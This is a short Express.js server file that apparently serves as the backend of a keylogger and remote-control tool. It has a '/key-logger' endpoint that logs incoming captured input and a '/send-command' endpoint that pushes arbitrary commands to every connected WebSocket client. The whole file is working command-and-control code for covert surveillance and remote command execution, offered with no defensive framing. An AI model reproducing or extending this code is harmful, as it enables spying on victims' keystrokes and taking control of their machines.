import express from 'express';
import cors from 'cors';
import http from 'http';
import ws_server, {CLIENTS} from "./ws_server.js";


const app = express();

// Middleware to disable cors
app.use(cors())

// Middleware to parse JSON bodies
app.use(express.json());

// POST request handler
app.post('/key-logger', (req, res) => {
    console.log(req.body); // Logs the request body to the console
    res.status(200)
});

app.post('/send-command', (req, res) => {
    if (!req.body.command) {
        res.status(400).send('Bad request')
    }

    CLIENTS.forEach(client => {
        client.send(req.body.command)
    })

    res.status(200).send('Command sent')
})

export const http_server = http.createServer(app);
